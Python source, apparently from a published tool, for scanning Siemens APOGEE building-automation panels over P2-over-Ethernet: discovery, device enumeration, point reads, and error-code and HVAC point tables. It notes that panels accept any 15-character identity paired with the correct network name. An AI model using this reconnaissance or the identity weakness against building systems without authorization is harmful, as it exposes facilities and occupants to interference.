#!/usr/bin/env python3
"""
Siemens P2 Protocol Scanner
============================
Universal scanner for Siemens PXC field panels participating in the Apogee
Ethernet variant of the P2 protocol. Discovers panels, enumerates FLN
devices, reads point values, and queries firmware/system information — all
over the P2-over-Ethernet transport (default TCP/5033).

Quick Start:
    python p2_scanner.py --pcap capture.pcapng                              # Learn BLN name
    python p2_scanner.py --discover --range 192.0.2.0/24 --network MYBLN     # Find everything
    python p2_scanner.py -n 192.0.2.50 -d DEVICE1 -p "ROOM TEMP" --network MYBLN  # Read a point

Protocol context (Siemens canonical vocabulary)
-----------------------------------------------
Siemens describes the APOGEE / Desigo system as three tiers:

  * MLN — Management Level Network (Insight / Desigo CC management
          stations on Ethernet TCP/IP). Optional Datamate Advanced (DMA).
  * BLN/ALN — Building-Level Network (legacy term) / Automation Level
          Network (current term). Field panels (PXC, PXC Modular, PXC
          Compact, MEC, MBC) AND the management station participate here
          as peer nodes. Wire format slot 1 = BLN identifier (case-
          sensitive ASCII). Siemens uses BLN and ALN interchangeably;
          firmware prompts still display "BLN".
  * FLN — Floor Level Network (TECs, UCs, VFDs). P1 over RS-485 or
          BACnet MS/TP. Not addressed by this scanner.

This scanner targets the BLN/ALN tier on the Apogee Ethernet (TCP-based)
variant. Robert Old (Siemens BT system architect, 2001) named the four
P2 variants: Pre-APOGEE (RAD-50/RS-485), APOGEE (ASCII/RS-485), APOGEE
Ethernet (this scanner's target), APOGEE BACnet. Per Siemens spec sheets
149-487 and 553-104 an Ethernet ALN is capped at 100 nodes per BLN.

A P2 EBLN is a full-mesh of long-lived TCP sessions: every peer node
listens on the configured port AND opens outbound client sockets to
every other peer (N participants → up to N(N-1) TCP sessions). PurpleSwift
documents this for their BACnetP2 gateway; Siemens 149-1006 confirms
"Traffic must be allowed at both the field panels and the computer
hosting the ALN for proper communication."

Port assignment
---------------
P2_PORT below defaults to 5033, the Siemens-documented value per the
white paper 149-1006 ("Configuring an APOGEE System on an IT
Infrastructure", June 2016). The port is CONFIGURABLE via Desigo CC's
"Our Server Port" setting; both the management station and every panel
must agree. The only Siemens-documented reason to deviate from 5033 is
a Datamate Advanced (DMA) co-installation collision. Override P2_PORT
(or use --port) on sites where the configured P2 ALN port is not 5033.

Terminology in this codebase
----------------------------
We use SCANNER_NAME and references to "supervisor" colloquially for the
Desigo CC / Insight management station. In Siemens' formal vocabulary
the management station is a peer node with an "Our Node" drop number
(1-99), not architecturally distinct from a field panel. We use
"supervisor" because operators recognize it; the BLN tier has no formal
"supervisor" in Siemens' model.

Wire format derived from protocol analysis of network captures plus
Siemens-published documents 125-3019 (APOGEE P2 ALN Field Panel User's
Manual), 149-1006 (Configuring an APOGEE System on an IT Infrastructure),
149-487 (PXC Modular for BACnet Networks spec), and 553-104 (PXC Compact
Series Owner's Manual). No reverse engineering of Siemens binaries was
performed.
"""

import socket
import struct
import time
import sys
import os
import argparse
import json
import csv
import re
import secrets
from datetime import datetime
from collections import Counter, OrderedDict
from typing import Optional, Dict, List, Tuple, Any, Callable

import firmware_registry  # APOGEE_P2_SPEC.md §30 — fast-path dialect lookup
import p2_data            # compiled-in opcode / point-type / enum tables

# ─────────────────────────────────────────────────────────────────────────────
# A note on `APOGEE_P2_SPEC.md §N` citations throughout this file.
#
# APOGEE_P2_SPEC.md is the internal working spec this tooling was built against.
# It is NOT shipped in this repository, and its section numbering does NOT
# correspond to the published PROTOCOL.md. Treat those citations as provenance
# markers ("this constant came from a specific documented observation"), not as
# links a reader can follow. The same applies to the occasional reference to
# OPCODES.md (an internal opcode audit, since folded into PROTOCOL.md 9) and to
# PUNCHLIST_REPO_HEALTH.md (an internal tracking document). Neither ships here.
#
# The published, self-contained reference is PROTOCOL.md in this repo. Where a
# claim here matters to a reader, the equivalent PROTOCOL.md section is:
#   frame layout / framing over TCP ......... §6.1
#   message classes & dialects .............. §6.2
#   direction byte .......................... §6.3
#   routing slots ........................... §6.4
#   sequence & request/response pairing ..... §6.5
#   success vs error responses, error codes . §7.2
#   connection & session model .............. §7.3
#   string TLV / scope tag / value fields ... §8.1-§8.3
#   date/time stamp ......................... §8.3.4
#   opcode catalog .......................... §9.5
#   COV body & condition block .............. §12.3
#   alarm report / ack opcodes .............. §13.6
#   firmware & revision identity ............ §16.5
#   destructive opcodes (documented, not implemented) §16.6, §17.4
# ─────────────────────────────────────────────────────────────────────────────

# Single source of truth for the scanner library version. Keep in sync
# with pyproject.toml's [project].version. `import p2_scanner` users can
# inspect `p2_scanner.__version__` rather than parsing pyproject metadata.
__version__ = "1.3.1"

# Console output uses Unicode formatting chars (✓ ✗ ⚠ ── → ═) for readability.
# Windows defaults to cp1252 in cmd.exe / PowerShell, which crashes on these.
# Reconfigure stdout/stderr to UTF-8 so the script works on stock Windows
# without requiring users to set PYTHONIOENCODING themselves. Python 3.7+.
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
except (AttributeError, OSError):
    pass  # already UTF-8, or stdout was redirected to something that can't be reconfigured

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION — Defaults are auto-learned when possible
# ═══════════════════════════════════════════════════════════════════════════════

P2_PORT = 5033                   # Siemens-documented default per white paper 149-1006.
                                 # CONFIGURABLE — "Our Server Port" in Desigo CC; both the
                                 # management station and every panel must agree. The only
                                 # Siemens-documented reason to deviate is a Datamate
                                 # Advanced (DMA) co-installation collision. Override via
                                 # --port on sites where the configured P2 ALN port is
                                 # not 5033.
P2_NETWORK = ""                  # BLN name (slot 1 of every P2 frame). Case-sensitive
                                 # ASCII per Siemens Desigo CC Engineering Help.
                                 # Auto-learned from first connection.
P2_SITE = ""                     # Site name (free text, spaces allowed in Siemens HMI;
                                 # used as the SYST scope footer in some opcode responses).
                                 # Auto-learned from first connection.

# Honest, obviously-a-scanner identity placed in slot 4 of the handshake.
# The tool announces itself AS a scanner — it does NOT impersonate the
# supervisor. A connecting node must register an identity to read anything
# (that is simply how P2 works); making that identity clearly read "a
# scanner was here" in the panel's NODE NAME TABLE is the read-only-by-
# default, leave-an-audit-trail posture. The port suffix is the conventional
# `<host>|<listen-port>` form; effective_scanner_name() derives it from the
# active port. An operator who must present a specific identity can override
# with --scanner-name. See APOGEE_P2_SPEC.md §9.3 for the slot-4 identity.
_GENERIC_SCANNER_NAME = "P2SCAN-LAP|5033"
SCANNER_NAME = _GENERIC_SCANNER_NAME

DEBUG_READS = False              # When True, print raw hex on parse failures
CONNECT_TIMEOUT = 5              # TCP connect timeout (seconds)
READ_TIMEOUT = 10                # Read response timeout (seconds)
HANDSHAKE_PROBE_TIMEOUT = 2.0    # First-dialect probe timeout — see _handshake(). A PXC speaking the legacy dialect
                                 # responds well under a second; a PXC speaking the modern dialect stays silent.
                                 # Setting this too long makes modern-dialect panels slow to connect; too short and
                                 # a congested network falsely fails the first attempt.

# Known nodes (optional — populated by discovery or site config file)
# Format: {"NODE_NAME": "IP_ADDRESS", ...}
KNOWN_NODES = {}


def _set_network(name: str):
    global P2_NETWORK
    P2_NETWORK = name

def _set_scanner_name(name: str):
    global SCANNER_NAME
    SCANNER_NAME = name


def effective_scanner_name() -> str:
    """Return the identity to put in slot 4 of the handshake.

    Honest-by-default: the scanner announces itself as an obviously-a-scanner
    node, NOT as the supervisor. A clearly-labeled entry is what a colleague
    sees in the panel's NODE NAME TABLE — it should read "a scanner was here",
    not impersonate Desigo CC.

    Resolution order:
      1. If SCANNER_NAME was explicitly set (--scanner-name, _set_scanner_name,
         or a scanner_name field in site.json), use it verbatim — the escape
         hatch for an operator who must present a specific identity.
      2. Otherwise the honest generic `P2SCAN-LAP|<active-port>`.

    Acceptance note: on the firmware tested here a panel accepts any slot-4
    identity of >=15 characters paired with the correct BLN; `P2SCAN-LAP|5033`
    is 15 chars and the port suffix is the conventional `<host>|<listen-port>`
    form. This is a wire-observed behavior, not a documented guarantee.
    """
    if SCANNER_NAME and SCANNER_NAME != _GENERIC_SCANNER_NAME:
        return SCANNER_NAME
    return f"P2SCAN-LAP|{P2_PORT}"


# Status-byte error code lookup (see P2Connection._parse_read_response).
# These are the u16 BE codes that follow the direction byte 0x05 in error
# responses. Full catalog of 37 codes per APOGEE_P2_SPEC.md §10.2; codes
# observed on the wire most often (0x0003, 0x00AC, 0x0E15) are commented.
_P2_STATUS_ERRORS = {
    0x0001: 'no_memory_available',               # E1     no memory for the record
    0x0002: 'invalid_command',                   # E2     the command is not valid for this object (e.g. commanding a non-virtual LDI or LAI point)
    0x0003: 'not_found',                         # E3     the named object does not exist on the panel
    0x0004: 'priority_too_low',                  # E4     the commanding priority is below the point's active priority
    0x0005: 'no_change',                         # E5     the point is already in the requested condition
    0x0007: 'point_failed',                      # E7     the commanded point is failed (usually hardware)
    0x0008: 'out_of_service',                    # E8     the point is operator-disabled
    0x0009: 'already_exists',                    # E9     a define collided with an existing record
    0x000A: 'trend_already_exists',              # E10    the point is already trended
    0x000B: 'value_unchanged',                   # E11    the point already holds the requested value
    0x000C: 'value_out_of_range',                # E12    the value is outside the point's range
    0x000D: 'not_hostcaller_node',               # E13    the node is not a host-caller node
    0x0016: 'line_not_traced',                   # E22    a PPCL line was reached but not traced
    0x0028: 'invalid_dst_pair',                  # E40    the daylight-saving date pair is invalid
    0x0040: 'invalid_report_id',                 # E64    the requested report does not exist
    0x0065: 'command_not_supported',             # E101   the selected function is not supported
    0x0080: 'invalid_user_id',                   # E128   login attempted with an unknown user id
    0x0081: 'invalid_password',                  # E129   login attempted with a wrong password
    0x0082: 'user_accounts_database_full',       # E130   the user-account database is full
    0x00AB: 'coldstart_required',                # E171   the panel cannot accept a database load until it is coldstarted
    0x00AC: 'not_supported',                     # E172   the P2/P3 function code is not supported by this panel -- unused, or specific to another firmware revision
    0x00B7: 'too_many_framing_errors',           # E183   excessive framing errors on the network
    0x00B8: 'scu_no_answer',                     # E184   the SCU did not answer
    0x00F9: 'invalid_point_address',             # E249   the point address is not valid
    0x00FA: 'failed_io_device',                  # E250   the input/output board is failed
    0x00FE: 'io_timeout',                        # E254   input/output timed out during a load or verify
    0x0200: 'monitor_list_full',                 # E512   the point monitor list is full
    0x0202: 'flt_transfer_in_progress',          # E514   a database transfer is already running
    0x0203: 'flt_transfer_killed',               # E515   the database transfer aborted
    0x0205: 'tec_not_added',                     # E517   point addition failed -- the panel lacks long-point-name support
    0x0206: 'connection_lost',                   # E518   a panel failed while a command was in progress
    0x0207: 'warm_started',                      # E519   a warmstart occurred while a command was in progress
    0x0209: 'protocol_error',                    # E521   a low-level protocol error occurred during a command
    0x0210: 'timeout',                           # E528   the server panel did not answer in the allotted time
    0x0E10: 'fln_invalid_fln_number',            # E3600  FLN number outside the supported range
    0x0E11: 'fln_invalid_drop_number',           # E3601  the FLN device's drop number is invalid
    0x0E12: 'fln_device_failed',                 # E3602  the FLN device is failed
    0x0E13: 'fln_invalid_point_number',          # E3603  the point address is outside the device's range
    0x0E14: 'fln_physical_point_failed',         # E3604  the physical point is failed
    0x0E15: 'physical_point_not_commandable',    # E3605  the physical point cannot process commands
    0x0E16: 'fln_value_out_of_range',            # E3606  the commanded value is outside the point's physical range
    0x0E17: 'fln_application_invalid_for_device', # E3607  the application is not valid for this FLN device
}


class ScannerInputError(ValueError):
    """Raised when the scanner is asked to do something the DBF or protocol
    rules say is invalid — e.g. reading an out-of-range slot, or reading a
    slot that isn't defined in the device's application (without --force-slot).

    The CLI catches this and exits with code 2 so shell scripts and parent
    processes can distinguish 'bad input' from 'ran fine but found nothing'.
    Library callers who want to handle input errors themselves can catch it
    directly; those who don't care will get a normal Python traceback.
    """
    pass


# Sanity bound for any string that lands in a NUL-terminated routing slot.
# Not a protocol constant — the true panel-side field width isn't pinned in
# PROTOCOL.md. 64 is comfortably above every observed identity (the
# conventional form is 15 chars, e.g. `P2SCAN-LAP|5033`) while still catching
# a config typo or a pasted blob before it reaches the wire.
MAX_WIRE_NAME = 64


def _wire_name(value: Optional[str], field: str,
               max_len: int = MAX_WIRE_NAME) -> bytes:
    """Validate and ASCII-encode a name bound for a NUL-terminated P2 slot.

    The four routing slots are delimited by NUL bytes, so a name that itself
    contains a NUL emits an extra delimiter and desynchronizes the panel's
    four-slot parse — the frame is then misrouted or dropped, with no error
    surfaced to us. Non-ASCII raises UnicodeEncodeError deep in the payload
    builder, which escapes the ScannerInputError contract the CLI relies on
    for its exit-code-2 behavior. Both are caught here, at the one boundary
    where a Python string becomes wire bytes.

    Empty is permitted: P2_NETWORK/P2_SITE are legitimately empty before a
    site config is loaded, and an empty slot is a valid frame.

    Raises ScannerInputError on any violation.
    """
    if value is None:
        value = ''
    if not isinstance(value, str):
        raise ScannerInputError(
            f"{field} must be a string, got {type(value).__name__}")
    if '\x00' in value:
        raise ScannerInputError(
            f"{field} contains an embedded NUL byte at index "
            f"{value.index(chr(0))}; NUL is the routing-slot delimiter and "
            f"cannot appear inside a name")
    try:
        encoded = value.encode('ascii')
    except UnicodeEncodeError as exc:
        raise ScannerInputError(
            f"{field} must be ASCII; {value!r} contains a non-ASCII "
            f"character at index {exc.start}") from exc
    if len(encoded) > max_len:
        raise ScannerInputError(
            f"{field} is {len(encoded)} bytes; the limit is {max_len}")
    return encoded


def save_config(filepath: str):
    """Save learned P2 network config to a JSON file.

    Also persists the firmware_registry build-tag cache under
    ``known_builds`` so the next process can skip the §11.2 dialect probe
    on first contact to known panels.
    """
    config = {
        'p2_network': P2_NETWORK,
        'p2_site': P2_SITE,
        'scanner_name': SCANNER_NAME,
        'known_nodes': KNOWN_NODES,
        'known_builds': firmware_registry.all_cached_build_tags(),
    }
    with open(filepath, 'w') as f:
        json.dump(config, f, indent=2)
    print(f"  Config saved to {filepath}")


def load_config(filepath: str) -> bool:
    """Load P2 network config from a JSON file.

    Populates the firmware_registry build-tag cache from ``known_builds``
    when present; this enables the §30.4 fast-path on first contact.
    Unknown fields are tolerated (forward compat).
    """
    global P2_NETWORK, P2_SITE, SCANNER_NAME, KNOWN_NODES
    try:
        with open(filepath, 'r') as f:
            config = json.load(f)
        if config.get('p2_network'):
            P2_NETWORK = config['p2_network']
        if config.get('p2_site'):
            P2_SITE = config['p2_site']
        if config.get('scanner_name'):
            SCANNER_NAME = config['scanner_name']
        if config.get('known_nodes'):
            KNOWN_NODES.update(config['known_nodes'])
        firmware_registry.load_build_tags(config.get('known_builds'))
        # No scanner_name pinned → keep the honest, obviously-a-scanner
        # default (`P2SCAN-LAP|<port>`, via effective_scanner_name()). The
        # tool does not auto-impersonate the supervisor; set scanner_name in
        # the config or pass --scanner-name to present a specific identity.
        print(f"  Config loaded from {filepath}")
        print(f"  Network: {P2_NETWORK}  |  Site: {P2_SITE}  |  "
              f"Nodes: {len(KNOWN_NODES)}  |  "
              f"Builds cached: {len(firmware_registry.all_cached_build_tags())}")
        return True
    except FileNotFoundError:
        print(f"  [ERROR] Config file not found: {filepath}")
        return False
    except json.JSONDecodeError:
        print(f"  [ERROR] Invalid config file: {filepath}")
        return False

# ═══════════════════════════════════════════════════════════════════════════════
# TEC APPLICATION POINT DEFINITIONS — LEGACY HARDCODED FALLBACK
# ═══════════════════════════════════════════════════════════════════════════════
# These tables (COMMON_POINTS / HEATING_POINTS / REHEAT_POINTS / HW_VALVE_POINTS
# / FAN_POINTS / SUPPLY_TEMP_POINT) are the **legacy fallback** point catalog,
# used by `get_point_table` ONLY when the full catalog cannot be loaded at all.
# In practice that never happens: the complete 1070-application catalog is
# EMBEDDED IN THIS FILE as a gzip+base64 blob (`_TECPOINTS_GZ_B64`, ~362 KB
# encoded, ~5.7 MB expanded) and is the last entry in the loader's search
# order, so a bare copy of p2_scanner.py with no data files beside it still
# resolves every application. That is deliberate: one file, nothing to install,
# nothing to forget to copy. An external tecpoints.json still overrides it.
#
# 46 of those 1070 applications carry names only -- point number and point
# name, no data type -- and are marked `"src": "catalog-merge"` per entry so
# a consumer can tell a name-only slot from a fully typed one. Regenerate the
# blob with working/sweep/gen_tecpoints.py; never hand-edit it.
#
# Kept on disk for:
#   - resilience when running an out-of-tree script without the data package
#   - documenting which slots define the "common-TEC" lineage these tables grew
#     out of (apps 2020-2027 are the historical VAV cooling/heating family)
#
# DO NOT add new applications here. New apps go in tecpoints.json upstream
# (see PUNCHLIST_REPO_HEALTH.md H-32 for retirement rationale).
#
# Each TEC has up to 99 subpoints. Slot 0 is reserved; 1-99 are subpoints.
# Format: address -> (name, description, units, read_only)

# Common points present in ALL applications (2020-2027)
COMMON_POINTS = {
    1:  ("CTLR ADDRESS",   "Controller FLN address",              "",      False),
    2:  ("APPLICATION",    "Application number",                   "",      True),
    3:  ("CTL TEMP",       "Control temperature",                  "DEG F", True),
    4:  ("ROOM TEMP",      "Room temperature sensor reading",      "DEG F", True),
    6:  ("DAY CLG STPT",   "Day cooling setpoint",                 "DEG F", False),
    8:  ("NGT CLG STPT",   "Night cooling setpoint",               "DEG F", False),
    11: ("RM STPT MIN",    "Room setpoint dial minimum",           "DEG F", False),
    12: ("RM STPT MAX",    "Room setpoint dial maximum",           "DEG F", False),
    13: ("RM STPT DIAL",   "Room setpoint dial reading",           "DEG F", True),
    14: ("STPT DIAL",      "Setpoint dial enabled",                "",      False),
    18: ("WALL SWITCH",    "Wall switch monitoring enabled",       "",      False),
    19: ("DI OVRD SW",     "Override switch status",               "",      True),
    20: ("OVRD TIME",      "Override duration (hours)",            "",      False),
    21: ("NGT OVRD",       "Night override active",                "",      True),
    24: ("DI 2",           "Digital input 2 status",               "",      True),
    29: ("DAY.NGT",        "Day/Night mode",                       "",      True),
    31: ("CLG FLOW MIN",   "Cooling minimum airflow",              "",      False),
    32: ("CLG FLOW MAX",   "Cooling maximum airflow",              "",      False),
    35: ("CTL STPT",       "Active control setpoint",              "DEG F", True),
    36: ("CTL FLOW MIN",   "Active control flow minimum",          "",      True),
    37: ("CTL FLOW MAX",   "Active control flow maximum",          "",      True),
    38: ("FLOW STPT",      "Flow setpoint",                        "PCT",   True),
    39: ("FLOW",           "Actual airflow percentage",            "PCT",   True),
    40: ("AIR VOLUME",     "Air volume (CFM)",                     "",      True),
    41: ("DMPR POS",       "Damper position",                      "PCT",   True),
    42: ("DMPR COMD",      "Damper command",                       "PCT",   True),
    43: ("DMPR STATUS",    "Damper status",                        "",      True),
    44: ("DMPR ROT ANG",   "Damper rotation angle",                "",      False),
    45: ("DUCT AREA",      "Duct cross-sectional area (sq ft)",    "",      False),
    46: ("FLOW COEFF",     "Flow coefficient",                     "",      True),
    47: ("CLG LOOPOUT",    "Cooling loop output",                  "PCT",   True),
    48: ("CLG BIAS",       "Cooling bias",                         "PCT",   False),
    49: ("CLG P GAIN",     "Cooling proportional gain",            "",      False),
    50: ("CLG I GAIN",     "Cooling integral gain",                "",      False),
    51: ("CLG D GAIN",     "Cooling derivative gain",              "",      False),
    52: ("FLOW P GAIN",    "Flow proportional gain",               "",      False),
    53: ("FLOW I GAIN",    "Flow integral gain",                   "",      False),
    54: ("FLOW D GAIN",    "Flow derivative gain",                 "",      False),
    55: ("FLOW BIAS",      "Flow bias",                            "PCT",   False),
    58: ("SWITCH LIMIT",   "Switch limit",                         "PCT",   False),
    59: ("SWITCH DBAND",   "Switch deadband",                      "DEG F", False),
    60: ("SWITCH TIME",    "Switch time (minutes)",                "",      False),
    70: ("DO 1",           "Digital output 1",                     "",      True),
    71: ("DO 2",           "Digital output 2",                     "",      True),
    75: ("DO 6",           "Digital output 6",                     "",      True),
    80: ("CAL SETUP",      "Calibration setup",                    "",      False),
    81: ("CAL MODULE",     "Calibration module",                   "",      True),
    82: ("CAL TIMER",      "Calibration timer",                    "",      True),
    83: ("CAL AIR",        "Calibration air",                      "",      True),
    84: ("MTR SETUP",      "Motor setup",                          "",      False),
    85: ("MTR1 TIMING",    "Motor 1 timing",                       "SEC",   False),
    86: ("MTR2 TIMING",    "Motor 2 timing",                       "SEC",   False),
    87: ("MTR3 TIMING",    "Motor 3 timing",                       "SEC",   False),
    90: ("LOOP TIME",      "Control loop time",                    "SEC",   False),
    91: ("ERROR STATUS",   "Error status",                         "",      True),
    92: ("DO DIR. REV",    "DO direction reverse",                 "",      False),
    93: ("VALVE COUNT",    "Number of valve actuators",            "",      False),
    95: ("DO 3",           "Digital output 3",                     "",      True),
    96: ("DO 4",           "Digital output 4",                     "",      True),
    97: ("DO 5",           "Digital output 5",                     "",      True),
    98: ("TOTAL VOLUME",   "Totalized air volume",                 "",      True),
}

# Points specific to heating applications (2021-2027)
HEATING_POINTS = {
    5:  ("HEAT.COOL",      "Current heating/cooling mode",         "",      True),
    7:  ("DAY HTG STPT",   "Day heating setpoint",                 "DEG F", False),
    9:  ("NGT HTG STPT",   "Night heating setpoint",               "DEG F", False),
    25: ("DI 3",           "Digital input 3 status",               "",      True),
    33: ("HTG FLOW MIN",   "Heating minimum airflow",              "",      False),
    34: ("HTG FLOW MAX",   "Heating maximum airflow",              "",      False),
    56: ("HTG LOOPOUT",    "Heating loop output",                  "PCT",   True),
    57: ("HTG BIAS",       "Heating bias",                         "PCT",   False),
    61: ("HTG P GAIN",     "Heating proportional gain",            "",      False),
    62: ("HTG I GAIN",     "Heating integral gain",                "",      False),
    63: ("HTG D GAIN",     "Heating derivative gain",              "",      False),
}

# Points for reheat applications (2022-2027)
REHEAT_POINTS = {
    15: ("AUX TEMP",       "Auxiliary temperature sensor",         "DEG F", True),
    16: ("FLOW START",     "Heating flow start threshold",         "PCT",   False),
    17: ("FLOW END",       "Heating flow end threshold",           "PCT",   False),
    22: ("REHEAT START",   "Reheat start threshold",               "PCT",   False),
    23: ("REHEAT END",     "Reheat end threshold",                 "PCT",   False),
}

# Hot water valve points (2023, 2025, 2027)
HW_VALVE_POINTS = {
    64: ("VLV1 POS",       "Valve 1 position",                    "PCT",   True),
    65: ("VLV1 COMD",      "Valve 1 command",                     "PCT",   True),
    66: ("VLV2 POS",       "Valve 2 position",                    "PCT",   True),
    67: ("VLV2 COMD",      "Valve 2 command",                     "PCT",   True),
}

# Fan points (2024-2027)
FAN_POINTS = {
    26: ("SERIES ON",      "Series fan ON threshold",              "",      False),
    27: ("SERIES OFF",     "Series fan OFF threshold",             "",      False),
    28: ("PARALLEL ON",    "Parallel fan ON threshold",            "",      False),
    30: ("PARALLEL OFF",   "Parallel fan OFF threshold",           "",      False),
}

# Supply temp for 2021
SUPPLY_TEMP_POINT = {
    15: ("SUPPLY TEMP",    "Supply air temperature",               "DEG F", True),
}


def get_point_table(application: int) -> Dict[int, tuple]:
    """Build the complete point table for a given TEC application number.

    First tries to load from tecpoints.json (rich format with
    1024 apps — PTYPE / slope / intercept / state labels / per-app _meta).
    Falls back to legacy tecpnts.json (name/units/dtype tuples).
    Falls back to the hardcoded COMMON_POINTS / HEATING_POINTS / ... tables
    above for apps 2020-2027 only if neither JSON catalog is reachable; that
    path is dead for normal installs (the data package always ships).

    Return format: {addr: (name, desc, units, read_only)} — same tuple shape
    as before for backwards compatibility with all call sites.
    Rich metadata is also available via get_point_info() for the output path.
    """
    global _TECPNTS_DB

    if _TECPNTS_DB is None:
        _TECPNTS_DB = _load_tecpnts_db()

    if _TECPNTS_DB and str(application) in _TECPNTS_DB:
        app_data = _TECPNTS_DB[str(application)]
        points = {}
        for addr_str, info in app_data.items():
            try:
                addr = int(addr_str)
            except (ValueError, TypeError):
                continue
            # Support both rich dict format and legacy list format
            if isinstance(info, dict):
                name = info.get('name', '')
                units = info.get('units', '')
                ptype = info.get('ptype', 4)
                # ptype 1,10 = digital RW; ptype 2 = digital RO (mostly);
                # ptype 3 = analog RO (input); ptype 4 = analog RW.
                # Use 'rw' field when present, else fall back to ptype mapping.
                rw_flag = info.get('rw')
                if rw_flag is None:
                    rw_flag = ptype not in (2, 3)
                ro = not rw_flag
            else:  # legacy list format: [name, units, dtype_str]
                name = info[0]
                units = info[1] if len(info) > 1 else ""
                dtype = info[2] if len(info) > 2 else "AO"
                ro = dtype in ('AI', 'BI')
            points[addr] = (name, name, units, ro)
        return OrderedDict(sorted(points.items()))

    # Fallback to hardcoded tables
    points = dict(COMMON_POINTS)

    if application == 2020:
        points[25] = ("DI 3", "Digital input 3 status", "", True)
    elif application == 2021:
        points.update(HEATING_POINTS)
        points.update(SUPPLY_TEMP_POINT)
    elif application == 2022:
        points.update(HEATING_POINTS)
        points.update(REHEAT_POINTS)
    elif application == 2023:
        points.update(HEATING_POINTS)
        points.update(REHEAT_POINTS)
        points.update(HW_VALVE_POINTS)
    elif application in (2024, 2025):
        points.update(HEATING_POINTS)
        points.update(REHEAT_POINTS)
        points.update(FAN_POINTS)
        if application == 2025:
            points.update(HW_VALVE_POINTS)
    elif application in (2026, 2027):
        points.update(HEATING_POINTS)
        points.update(REHEAT_POINTS)
        points.update(FAN_POINTS)
        if application == 2027:
            points.update(HW_VALVE_POINTS)

    return OrderedDict(sorted(points.items()))


def get_point_info(application: int, point_name: str) -> Optional[Dict]:
    """Get the rich metadata entry for a specific (app, point name).
    Returns a dict with keys like 'name', 'ptype', 'type', 'units', 'slope',
    'intercept', 'on_label', 'off_label', 'rw'. Returns None if not found.

    Only works when tecpoints.json (rich format) is loaded.
    """
    global _TECPNTS_DB
    if _TECPNTS_DB is None:
        _TECPNTS_DB = _load_tecpnts_db()
    if not _TECPNTS_DB:
        return None
    app_data = _TECPNTS_DB.get(str(application))
    if not app_data:
        return None
    # Scan entries for a name match (point_name is the lookup key from live data)
    for addr_str, info in app_data.items():
        if isinstance(info, dict) and info.get('name') == point_name:
            return info
    return None


def resolve_slot_to_name(application: int, slot: int) -> Optional[str]:
    """Look up the point name registered at a specific slot number for an app.
    Returns None if the slot isn't defined in the app's point table.

    This is what lets '-p 29' mean 'read whatever's at slot 29 for this device.'
    """
    global _TECPNTS_DB
    if _TECPNTS_DB is None:
        _TECPNTS_DB = _load_tecpnts_db()
    if not _TECPNTS_DB:
        return None
    app_data = _TECPNTS_DB.get(str(application))
    if not app_data:
        return None
    entry = app_data.get(str(slot))
    if isinstance(entry, dict):
        return entry.get('name')
    elif isinstance(entry, (list, tuple)) and entry:
        # Legacy format support
        return entry[0]
    return None


def get_point_slot(application: int, point_name: str) -> Optional[int]:
    """Reverse lookup: find the slot number for a point name within an app.
    Used for display — shows the Desigo-style '(29) DAY.NGT' prefix."""
    global _TECPNTS_DB
    if _TECPNTS_DB is None:
        _TECPNTS_DB = _load_tecpnts_db()
    if not _TECPNTS_DB:
        return None
    app_data = _TECPNTS_DB.get(str(application))
    if not app_data:
        return None
    for addr_str, info in app_data.items():
        name_in_db = None
        if isinstance(info, dict):
            name_in_db = info.get('name')
        elif isinstance(info, (list, tuple)) and info:
            name_in_db = info[0]
        if name_in_db == point_name:
            try:
                return int(addr_str)
            except (ValueError, TypeError):
                return None
    return None


def get_app_meta(application: int) -> Optional[Dict[str, Any]]:
    """Return the per-application `_meta` block from tecpoints.json (v2+).

    The v2 catalog format carries application-level metadata at the
    `_meta` key inside each app entry:

        {"descr": "VAV Cooling Only", "cab_type": "TEC", "type": "ELECTRIC",
         "rev": "VV11", "transport": "p1_fln", "has_point_data": true}

    Returns None when the catalog is older (v1), the application is unknown,
    or no `_meta` block is present. Loader-safe — auto-loads the catalog on
    first call.
    """
    global _TECPNTS_DB
    if _TECPNTS_DB is None:
        _TECPNTS_DB = _load_tecpnts_db()
    if not _TECPNTS_DB:
        return None
    app_data = _TECPNTS_DB.get(str(application))
    if not isinstance(app_data, dict):
        return None
    meta = app_data.get('_meta')
    return meta if isinstance(meta, dict) else None


def format_app_label(application: int, prefix: str = "APP ") -> str:
    """Format an application number with its catalog description (v2+).

    Returns a display-ready string like:
        "APP 2020 — VAV Cooling Only"        (v2 catalog with descr)
        "APP 2020"                            (v1 catalog or unknown app)
        ""                                    (when application is 0)

    The prefix is configurable for callers that already have an existing
    label format (e.g. `prefix="[APP "` produces `"[APP 2020 — VAV ..."`,
    suitable for inline-bracket use).
    """
    if not application:
        return ""
    meta = get_app_meta(application)
    base = f"{prefix}{application}"
    if meta and isinstance(meta.get('descr'), str) and meta['descr']:
        return f"{base} — {meta['descr']}"
    return base


def app_supports_p2(application: int) -> Optional[bool]:
    """Whether this TEC application is reachable over the P2 protocol.

    Apogee's TEC catalog spans two transports: `p1_fln` (Apogee P1 FLN bus,
    P2 reachable via 0x0986 enumerate + 0x0271/0x0220 reads) and
    `bacnet_mstp` (BACnet MSTP — addressable over BACnet/IP only when the
    panel acts as a BACnet router, NOT reachable through this protocol's
    wire opcodes). The catalog's `_meta.transport` field distinguishes
    them; `has_point_data` is False for every bacnet_mstp entry because
    the P2 catalog can't enumerate slot layouts the wire protocol doesn't
    own.

    Returns:
        True   — application is on a `p1_fln` transport (P2-reachable).
        False  — application is `bacnet_mstp` (not reachable via P2; the
                 scanner / bridge should route via BACnet).
        None   — catalog is v1 (no transport metadata) or app is unknown.
                 Callers should treat None as "assume reachable, try anyway."
    """
    meta = get_app_meta(application)
    if meta is None:
        return None
    transport = meta.get('transport')
    if transport == 'p1_fln':
        return True
    if transport == 'bacnet_mstp':
        return False
    # Unknown transport string — be conservative, return None to fall back
    # to "try anyway" behavior.
    return None


def render_point_value(value: float, info: Optional[Dict]) -> Tuple[str, str]:
    """Convert a raw float value into (display_str, value_text) using point info.

    display_str: what to show in a table cell (e.g. '74.0', 'NIGHT', '1 (ON)')
    value_text: just the label portion for digital points ('NIGHT'), empty string
                for analog points.

    If info is None or lacks labels, falls back to formatting the float.
    """
    if value is None:
        return ("—", "")

    # Digital points with on/off labels
    if info and 'on_label' in info and 'off_label' in info:
        # Siemens convention: 1 = ON/first-label, 0 = OFF/second-label
        label = info['on_label'] if value >= 0.5 else info['off_label']
        return (label, label)

    # Analog — format cleanly
    if value == int(value) and abs(value) < 100000:
